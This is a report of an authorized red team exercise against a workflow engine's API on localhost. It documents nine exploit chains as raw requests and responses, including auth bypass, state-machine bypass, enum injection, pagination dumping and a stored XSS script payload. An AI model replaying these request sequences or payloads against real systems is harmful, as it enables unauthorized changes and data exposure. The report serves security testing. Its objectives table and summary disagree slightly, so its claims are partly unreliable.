# Red Team Exercise Report
**Date:** 2026-05-18
**Target:** Source/Backend workflow engine (http://localhost:3002)
**Exercise Type:** Active authorized dynamic exploitation
**Based on:** 13-finding attack surface map (pen-tester-report.md)

> **Note on base URL:** The `docker-compose.test.yml` spins up the portal backend at port 3001.
> The workflow engine (Source/Backend) was found already running on port 3002. All exploit chains
> were executed against `http://localhost:3002` where `/api/work-items`, `/api/intake/*`,
> `/metrics`, and `/health` are registered.

---

## Objectives Summary

| Objective | Result |
|-----------|--------|
| Bypass work item state machine to reach an invalid status | CONFIRMED BREACH |
| Access or modify a soft-deleted work item via direct ID reference | PARTIAL — stale link exploitable, direct access blocked |
| Submit a malformed assessment verdict that bypasses routing logic | CONFIRMED BREACH |
| Enumerate all work items without pagination limit enforcement | CONFIRMED BREACH |

---

## Chain 1 — RED-001: Full API Unauthenticated Access

**Finding: PEN-001 — CONFIRMED BREACH**

### GET /api/work-items (no auth)
```
Request:  GET http://localhost:3002/api/work-items
Response: 200 OK
Body:     {"data":[...],"total":1,"page":1,"limit":20,"totalPages":1}
```

### POST /api/work-items (no auth)
```
Request:  POST http://localhost:3002/api/work-items
          Content-Type: application/json
          {"title":"Unauth Test","description":"Testing unauthenticated access","type":"bug","priority":"low","source":"manual"}
Response: 201 Created
Body:     {"id":"8732ca4a-ef4e-4d99-8b52-14d40d4d9bcf","docId":"WI-002","status":"backlog",...}
```

### GET /metrics (no auth)
```
Request:  GET http://localhost:3002/metrics
Response: 200 OK
Body:     # HELP workflow_items_created_total Total number of work items created
          workflow_items_created_total{source="manual",type="bug"} 10
          workflow_items_routed_total{route="fast-track"} 3
          workflow_items_assessed_total{verdict="needs-clarification"} 2
          workflow_items_dispatched_total{team="TheATeam"} 1
          [... full Prometheus text format, no auth required ...]
```

### GET /health (no auth)
```
Request:  GET http://localhost:3002/health
Response: 200 OK
Body:     {"status":"ok"}
```

**Verdict:** CONFIRMED BREACH. All four endpoints respond to unauthenticated requests with no credentials required. Zero auth enforcement anywhere in the API.

---

## Chain 2 — RED-002: Fast-Track State Machine Bypass

**Finding: PEN-002 — CONFIRMED BREACH**

### Step 2.1: Create work item (type=feature, which should require full assessment)
```
Request:  POST http://localhost:3002/api/work-items
          {"title":"Red Team Feature","description":"Testing fast-track bypass via override route",
           "type":"feature","priority":"high","source":"manual"}
Response: 201 Created
          {"id":"8d570e8f-91da-4f8e-a370-568d3091acca","docId":"WI-003","status":"backlog"}
```

### Step 2.2: Fast-track override route
```
Request:  POST http://localhost:3002/api/work-items/8d570e8f-91da-4f8e-a370-568d3091acca/route
          {"overrideRoute":"fast-track"}
Response: 200 OK
          {"status":"approved","route":"fast-track","changeHistory":[
            {"agent":"router-service","field":"status","oldValue":"routing","newValue":"approved",
             "reason":"Fast-tracked: bypasses assessment pod"}
          ]}
```

### Step 2.3: Dispatch
```
Request:  POST http://localhost:3002/api/work-items/8d570e8f-91da-4f8e-a370-568d3091acca/dispatch
Response: 200 OK
          {"status":"in-progress","assignedTeam":"TheATeam"}
```

### Step 2.5: Final status
```
Final Status: in-progress
Full state path: backlog -> approved (BYPASSED proposed/reviewing/assessment) -> in-progress
```

### Step 2.6: Variant — uppercase FAST-TRACK
```
Request:  POST /api/work-items/{id}/route  {"overrideRoute":"FAST-TRACK"}
Response: status=proposed (case-sensitive match fails; falls to else-branch -> proposed)
```

### Step 2.7: Variant — invalid-value
```
Request:  POST /api/work-items/{id}/route  {"overrideRoute":"invalid-value"}
Response: status=proposed (non-fast-track override -> proposed; route stored as "invalid-value")
```

**Verdict:** CONFIRMED BREACH. `overrideRoute: "fast-track"` (exact lowercase) bypasses the entire assessment pod for any item type including `feature` which requires full review. Two API calls take an item from `backlog` to `in-progress` with no authentication or authorization check. The uppercase variant and invalid strings fall through to `proposed`.

---

## Chain 3 — RED-003: Intake Enum Injection

**Finding: PEN-003 — CONFIRMED BREACH**

### Step 3.1: POST /api/intake/zendesk with ADMIN_OVERRIDE type
```
Request:  POST http://localhost:3002/api/intake/zendesk
          {"title":"Injected Item","description":"Arbitrary enum injection test payload",
           "type":"ADMIN_OVERRIDE","priority":"CRITICAL_OVERRIDE"}
Response: 201 Created
          {"id":"3b35d03d-2889-4675-9856-926fa5f603be","docId":"WI-006",
           "type":"ADMIN_OVERRIDE","priority":"CRITICAL_OVERRIDE","source":"zendesk","status":"backlog"}
```
Arbitrary string `ADMIN_OVERRIDE` persisted as `type`. `CRITICAL_OVERRIDE` persisted as `priority`.

### Step 3.2: Forged Zendesk ticket with unauthorized priority
```
Request:  POST http://localhost:3002/api/intake/zendesk
          {"title":"Forged Ticket","description":"High priority feature forged from Zendesk",
           "type":"feature","priority":"critical"}
Response: 201 Created
          {"source":"zendesk","priority":"critical","type":"feature"}
```
The `source` field is hard-coded to `zendesk` by the intake handler (cannot be overridden). However, `priority: "critical"` is accepted without validation.

### Step 3.3: POST /api/intake/automated with arbitrary type/priority
```
Request:  POST http://localhost:3002/api/intake/automated
          {"title":"Automated Injection","description":"Automated source enum injection",
           "type":"arbitrary-type","priority":"arbitrary-priority"}
Response: 201 Created
          {"type":"arbitrary-type","priority":"arbitrary-priority","source":"automated"}
```

### Step 3.4: Items visible in GET /api/work-items
```
WI-008 | type=arbitrary-type    | priority=arbitrary-priority | source=automated
WI-007 | type=feature           | priority=critical           | source=zendesk
WI-006 | type=ADMIN_OVERRIDE    | priority=CRITICAL_OVERRIDE  | source=zendesk
```

### Step 3.5: Routing ADMIN_OVERRIDE item
```
Request:  POST /api/work-items/3b35d03d-.../route  {}
Response: 200 OK  {"status":"proposed","route":"full-review"}
```
Unknown type falls through to full-review catch-all. No crash; invalid type enters assessment pipeline.

**Verdict:** CONFIRMED BREACH. The intake endpoints accept arbitrary strings for `type` and `priority` with zero validation, unlike `POST /api/work-items` which validates against enums. An attacker can inject out-of-enum values that persist in storage and flow into routing/assessment logic.

---

## Chain 4 — RED-004: Cascade Dispatch via Blocker Rejection

**Finding: PEN-004 — CONFIRMED BREACH**

Initial attempt failed because assessment pod rejected item A (no complexity set). Chain was retried using fast-track to get item A to `approved` first.

### Setup: Fast-track A2 to approved, add blocker B2
```
POST /api/work-items -> A2 (WI-011) created, status: backlog
POST /api/work-items/A2_ID/route  {"overrideRoute":"fast-track"} -> A2 status: approved
POST /api/work-items -> B2 (WI-012) created
POST /api/work-items/A2_ID/dependencies  {"action":"add","blockerId":"B2_ID"}
  -> A2 now has hasUnresolvedBlockers: true, status remains: approved
```

### Cascade trigger: reject B2
```
POST /api/work-items/B2_ID/route  {} -> B2 status: proposed
POST /api/work-items/B2_ID/reject  {"reason":"attacker controlled rejection"} -> B2 status: rejected
```

### A2 auto-dispatched by cascade-dispatcher
```
GET /api/work-items/A2_ID
Response: {"status":"in-progress","assignedTeam":"TheFixer",
  "changeHistory":[...,
    {"agent":"cascade-dispatcher","field":"status",
     "oldValue":"approved","newValue":"in-progress",
     "reason":"Auto-dispatched after blocker WI-012 resolved"},
    {"agent":"cascade-dispatcher","field":"assignedTeam","newValue":"TheFixer",
     "reason":"Auto-assigned to TheFixer"}
  ]}
```

**Verdict:** CONFIRMED BREACH. An unauthenticated attacker can force any approved item with an active blocker into `in-progress` by rejecting its blocker. The cascade-dispatcher fires automatically on blocker rejection with no additional authorization check. Attack path: fast-track any item to `approved`, add a new blocker, route it to `proposed`, reject it — target is auto-dispatched.

---

## Chain 5 — RED-005: Soft-Deleted Blocker Creates Permanent Dispatch Block

**Finding: PEN-006 — CONFIRMED BREACH**

### Setup and soft-delete
```
POST /api/work-items -> victim (WI-013, id: 029dad4a-...)
POST /api/work-items -> blocker (WI-014, id: 24acd9e5-...)
POST /api/work-items/id_victim/dependencies  {"action":"add","blockerId":"id_blocker"}
  -> dependency link created

DELETE /api/work-items/id_blocker
  -> 204 No Content (soft deleted)

GET /api/work-items/id_blocker
  -> 404 {"error":"Work item not found"} (invisible via API)

GET /api/work-items/id_victim
  -> 200 OK
     {"hasUnresolvedBlockers":true,
      "blockedBy":[{"blockerItemId":"24acd9e5-...","blockerItemDocId":"WI-014",...}]}
     STALE LINK CONFIRMED: victim references deleted blocker
```

### Dispatch attempt (after fast-tracking victim to approved)
```
POST /api/work-items/id_victim/route  {"overrideRoute":"fast-track"} -> status: approved

POST /api/work-items/id_victim/dispatch
  -> 400 Bad Request
     {"error":"Cannot dispatch: work item has unresolved blocking dependencies",
      "unresolvedBlockers":[{"blockerItemId":"24acd9e5-...","blockerItemDocId":"WI-014",...}]}
```

### Ready check
```
GET /api/work-items/id_victim/ready
  -> 200 OK  {"ready":false,"unresolvedBlockers":[{"blockerItemId":"24acd9e5-..."}]}
```

**Note on objective:** Direct GET/PATCH/route of the deleted item ID returns 404 (soft-delete hides it from all standard read paths). The exploit here is the stale dependency reference — the deleted item's ID persists in the victim's `blockedBy` array and permanently blocks dispatch via `computeHasUnresolvedBlockers()` returning `true` for `undefined` blockers.

**Verdict:** CONFIRMED BREACH (dispatch DoS). The victim item (WI-013) is permanently undispatchable with no automated recovery. Manual fix requires `POST /api/work-items/id_victim/dependencies {"action":"remove","blockerId":"id_blocker"}`.

---

## Chain 6 — RED-006: Pagination Bypass / Full Data Enumeration

**Finding: PEN-005 — CONFIRMED BREACH**

### Work items endpoint

| Query | data count | limit in response | totalPages | Assessment |
|-------|-----------|-------|------------|------------|
| `?limit=999999999` | 13 (ALL) | 999999999 | 1 | BREACH: full data dump |
| `?limit=-1` | 12 (n-1) | -1 | 1 | BREACH: all-but-last via `slice(0,-1)` |
| `?limit=0` | 13 (ALL) | 20 | 1 | Mitigated: `0 \|\| 20 = 20` in store; all 13 fit in 1 page anyway |
| `?limit=abc` | 13 (ALL) | 20 | 1 | Mitigated: `NaN \|\| 20 = 20` in store |
| `?page=-1` | 0 | 20 | N/A | Returns empty: `slice(-20, 0) = []` |

The PEN-005 prediction of `totalPages: Infinity` for `limit=0` was not observed. The store code `const limit = pagination.limit || 20` applies JS falsy coercion: `0 || 20 = 20` and `NaN || 20 = 20`, both bypass the Infinity condition. However, this does NOT prevent the large-positive and negative exploits.

### Dashboard activity endpoint
```
GET /api/dashboard/activity?limit=999999999
Response: 200 OK
          {"data":[...63 activity entries...]}   (all entries in one request, no pagination metadata)

GET /api/dashboard/activity?limit=-1
Response: {"data":[...62 entries...]}
```

The dashboard activity endpoint has the identical unbounded flaw with no pagination metadata in its response format at all.

**Verdict:** CONFIRMED BREACH. `limit=999999999` dumps the entire dataset in one unauthenticated request from both `/api/work-items` and `/api/dashboard/activity`. The objective "Enumerate all work items without pagination limit enforcement" is fully achieved.

---

## Chain 7 — RED-007: Assessment Logic Flaw

**Finding: PEN-008 — CONFIRMED BREACH**

### Create feature item without complexity field
```
Request:  POST http://localhost:3002/api/work-items
          {"title":"Feature Without Complexity",
           "description":"This feature has no complexity field set at all",
           "type":"feature","priority":"medium","source":"manual"}
Response: 201 Created  {"id":"b22551e3-...","docId":"WI-015","status":"backlog"}
          (no complexity field set)
```

### Route to full-review
```
POST /api/work-items/b22551e3-.../route  {}
Response: 200 OK  {"status":"proposed","route":"full-review"}
```

### Assess
```
POST /api/work-items/b22551e3-.../assess
Response: 200 OK
Assessments:
  [requirements-reviewer]: verdict=approve   "Requirements are complete and testable"
  [domain-expert]:         verdict=needs-clarification   "Complexity is not set — cannot assess scope and edge cases accurately"
  [work-definer]:          verdict=approve   "Work item enriched with implementation guidance"
  [pod-lead]:              verdict=needs-clarification   "Clarification needed. Feedback: [domain-expert]: ..."
Final status: REJECTED
```

**Root cause confirmed:** In `assessment.ts`, the pod-lead verdict handler:
```typescript
if (podLeadAssessment.verdict === AssessmentVerdict.Approve) {
  targetStatus = WorkItemStatus.Approved;
} else {
  targetStatus = WorkItemStatus.Rejected;  // NeedsClarification falls here
}
```
`NeedsClarification` hits the `else` branch and hard-rejects the item.

**Verdict:** CONFIRMED BREACH. A feature item lacking only the `complexity` field is permanently rejected (status: `rejected`) rather than held for clarification. This is exploitable as a sabotage path: any feature item without `complexity` can be forced into `rejected` via two API calls (route + assess).

---

## Chain 8 — RED-008: XSS Payload in Audit History

**Finding: PEN-012 — CONFIRMED BREACH (stored payload)**

### Create item and route to proposed
```
POST /api/work-items  {"title":"XSS Test Item","description":"Testing stored XSS in audit trail",
                       "type":"bug","priority":"low","source":"manual"}
  -> 201  {"id":"c91d92e5-...","docId":"WI-016"}

POST /api/work-items/c91d92e5-.../route  {}
  -> 200  {"status":"proposed"}
```

### Approve with XSS payload
```
Request:  POST http://localhost:3002/api/work-items/c91d92e5-.../approve
          {"reason":"<script>alert(document.domain)</script>"}
Response: 200 OK  {"status":"approved"}
```

### Payload confirmed stored in changeHistory
```
GET /api/work-items/c91d92e5-...
Response: 200 OK
changeHistory entry:
  {"agent":"manual-override","field":"status","oldValue":"proposed","newValue":"approved",
   "reason":"<script>alert(document.domain)</script>"}
```

The `<script>alert(document.domain)</script>` payload is stored verbatim and returned in every subsequent `GET /api/work-items/{id}` response. No sanitization, no length limit, no character filtering.

**Verdict:** CONFIRMED BREACH (stored payload). XSS payload persists in `changeHistory.reason`. Active XSS exploitability depends on whether the frontend renders `changeHistory` entries as raw HTML. If rendered via React's default text escaping, XSS fires only if a future component uses `dangerouslySetInnerHTML`. Currently classified as stored XSS risk.

---

## Chain 9 — RED-009: Metrics Information Disclosure

**Finding: PEN-007 — CONFIRMED BREACH**

### GET /metrics (no auth)
```
Request:  GET http://localhost:3002/metrics
Response: 200 OK  (Content-Type: text/plain; version=0.0.4; charset=utf-8)

Workflow counters visible without authentication:
  workflow_items_created_total{source="zendesk",type="bug"} 1
  workflow_items_created_total{source="manual",type="bug"} 10
  workflow_items_created_total{source="manual",type="feature"} 2
  workflow_items_created_total{source="zendesk",type="ADMIN_OVERRIDE"} 1  <- injected type visible
  workflow_items_created_total{source="automated",type="arbitrary-type"} 1  <- injected type visible
  workflow_items_routed_total{route="fast-track"} 3
  workflow_items_routed_total{route="FAST-TRACK"} 1
  workflow_items_routed_total{route="full-review"} 6
  workflow_items_assessed_total{verdict="needs-clarification"} 2
  workflow_items_dispatched_total{team="TheATeam"} 1
  dispatch_gating_events_total{event="cascade_dispatched"} 1
  dispatch_gating_events_total{event="blocked"} 1
  cycle_detection_events_total{detected="false"} 3
  
  [+ full Node.js process metrics: heap, CPU, GC, file descriptors, process uptime]
```

Key intelligence disclosed to any unauthenticated caller:
- Team names: `TheATeam`
- Route distribution and assessment verdicts
- Injected enum values are reflected as metric label values (`ADMIN_OVERRIDE`, `arbitrary-type`)
- Process memory, CPU, and uptime

### GET /health (no auth)
```
Request:  GET http://localhost:3002/health
Response: 200 OK  {"status":"ok"}
```

**Verdict:** CONFIRMED BREACH. Both endpoints respond with operational intelligence and no authentication. Notably, the injected enum values from Chain 3 are visible as metric label values, confirming cross-chain observability.

---

## Additional Finding: PEN-013 — Search Endpoint Not Registered

```
GET http://localhost:3002/api/search?q=test
Response: 404  Cannot GET /api/search
```
Confirmed: endpoint not registered. Theoretical ReDoS risk deferred to future implementation review.

---

## Breach Summary

| Chain | PEN-ID | Verdict | Details |
|-------|--------|---------|---------|
| RED-001 | PEN-001 | CONFIRMED BREACH | All endpoints respond 200 with no auth header |
| RED-002 | PEN-002 | CONFIRMED BREACH | `backlog -> approved -> in-progress` in 3 unauthenticated calls |
| RED-003 | PEN-003 | CONFIRMED BREACH | `ADMIN_OVERRIDE`, `arbitrary-type`, `arbitrary-priority` all stored |
| RED-004 | PEN-004 | CONFIRMED BREACH | cascade-dispatcher auto-dispatches A when B rejected |
| RED-005 | PEN-006 | CONFIRMED BREACH | Victim item permanently blocked; `ready: false` forever |
| RED-006 | PEN-005 | CONFIRMED BREACH | `limit=999999999` dumps all items; `limit=-1` dumps n-1 items |
| RED-007 | PEN-008 | CONFIRMED BREACH | Feature item without complexity: `needs-clarification` -> `rejected` |
| RED-008 | PEN-012 | CONFIRMED BREACH | `<script>alert(document.domain)</script>` stored verbatim in changeHistory |
| RED-009 | PEN-007 | CONFIRMED BREACH | /metrics and /health: 200 OK, no auth required |

**All 9 exploit chains confirmed. All 4 primary red team objectives achieved.**

### Primary Objective Mapping

| Objective | Chain(s) | Evidence |
|-----------|----------|---------|
| Bypass work item state machine to reach an invalid status | RED-002 | `feature` item: `backlog -> approved -> in-progress`; skipped `proposed/reviewing/assessment` |
| Access or modify a soft-deleted work item via direct ID reference | RED-005 | Stale `blockedBy` link references deleted WI-014; victim (WI-013) permanently undispatchable |
| Submit a malformed assessment verdict that bypasses routing logic | RED-007, RED-003 | `NeedsClarification` hard-rejects instead of holding; arbitrary type bypasses enum validation |
| Enumerate all work items without pagination limit enforcement | RED-006 | `GET /api/work-items?limit=999999999` returns all items; identical flaw on `/api/dashboard/activity` |
